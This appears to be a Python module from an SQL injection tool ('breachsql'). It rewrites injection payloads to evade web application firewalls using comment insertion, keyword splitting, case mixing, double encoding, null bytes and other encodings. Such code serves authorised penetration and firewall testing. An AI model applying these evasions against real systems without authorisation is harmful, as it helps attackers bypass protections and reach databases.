# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (c) 2026 CommonHuman-Lab
"""
WAF evasion transforms.
"""
from __future__ import annotations

import random
import re
import urllib.parse

from breachsql.engine.http.waf_detect import (
    EVASION_NONE,
    EVASION_SQL_COMMENT,
    EVASION_SQL_WHITESPACE,
    EVASION_SQL_CASE,
    EVASION_SQL_ENCODE,
    EVASION_SQL_MULTILINE,
    EVASION_CASE_MIXING,
    EVASION_DOUBLE_ENCODE,
    EVASION_NULL_BYTE,
    EVASION_HTML_ENCODE,
    EVASION_UNICODE,
    EVASION_COMMENT_BREAK,
    EVASION_NEWLINE,
    EVASION_BACKTICK,
    EVASION_CHUNKED_TAGS,
)


def apply_evasion(payload: str, evasion: str) -> str:
    """Apply a WAF evasion transform to a raw SQL payload string."""
    if evasion == EVASION_NONE:
        return payload

    if evasion == EVASION_SQL_COMMENT:
        result = payload
        for kw in ("SELECT", "UNION", "WHERE", "AND", "OR", "FROM", "INSERT", "UPDATE"):
            result = result.replace(kw, f"/**/{kw}/**/")
        return result

    if evasion == EVASION_SQL_WHITESPACE:
        return payload.replace(" ", "\t")

    if evasion == EVASION_SQL_CASE:
        def _rand_case(m):
            return "".join(
                c.upper() if random.random() > 0.5 else c.lower()
                for c in m.group(0)
            )
        return re.sub(r"[A-Za-z]+", _rand_case, payload)

    if evasion == EVASION_SQL_ENCODE:
        return urllib.parse.quote(payload, safe="")

    if evasion == EVASION_SQL_MULTILINE:
        result_parts: list[str] = []
        in_string = False
        for ch in payload:
            if ch == "'" and not in_string:
                in_string = True
                result_parts.append(ch)
            elif ch == "'" and in_string:
                in_string = False
                result_parts.append(ch)
            elif ch == " " and not in_string:
                result_parts.append("/*\n*/")
            else:
                result_parts.append(ch)
        return "".join(result_parts)

    if evasion == EVASION_CASE_MIXING:
        return payload.swapcase()

    if evasion == EVASION_DOUBLE_ENCODE:
        return urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe="")

    if evasion == EVASION_NULL_BYTE:
        return payload + "%00"

    if evasion == EVASION_HTML_ENCODE:
        _html_map = {
            "'": "&#39;",
            '"': "&quot;",
            "<": "&lt;",
            ">": "&gt;",
            "&": "&amp;",
            "=": "&#61;",
            "(": "&#40;",
            ")": "&#41;",
            ";": "&#59;",
            "-": "&#45;",
        }
        return "".join(_html_map.get(c, c) for c in payload)

    if evasion == EVASION_UNICODE:
        return "".join(
            f"\\u{ord(c):04x}" if c.isalpha() else c
            for c in payload
        )

    if evasion == EVASION_COMMENT_BREAK:
        result = payload
        for kw in ("UNION", "SELECT", "INSERT", "UPDATE", "DELETE",
                   "WHERE", "FROM", "AND", "OR", "ORDER", "GROUP",
                   "HAVING", "LIMIT", "SLEEP", "BENCHMARK", "WAITFOR"):
            split = max(2, len(kw) // 2)
            broken = kw[:split] + "/**/" + kw[split:]
            result = re.sub(
                re.escape(kw), broken, result, flags=re.IGNORECASE
            )
        return result

    if evasion == EVASION_NEWLINE:
        result = payload
        for kw in ("UNION", "SELECT", "INSERT", "UPDATE", "DELETE",
                   "WHERE", "FROM", "AND", "OR", "ORDER", "GROUP",
                   "HAVING", "LIMIT", "SLEEP", "WAITFOR"):
            result = result.replace(kw, f"%0a{kw}%0d")
            result = result.replace(kw.lower(), f"%0a{kw.lower()}%0d")
        return result

    if evasion == EVASION_BACKTICK:
        _kw_re = re.compile(
            r"\b(SELECT|FROM|WHERE|AND|OR|UNION|INSERT|UPDATE|DELETE|"
            r"ORDER|GROUP|HAVING|LIMIT|BY)\b",
            re.IGNORECASE,
        )
        return _kw_re.sub(lambda m: f"`{m.group(0)}`", payload)

    if evasion == EVASION_CHUNKED_TAGS:
        return "".join(f"%{ord(c):02x}" for c in payload)

    return payload
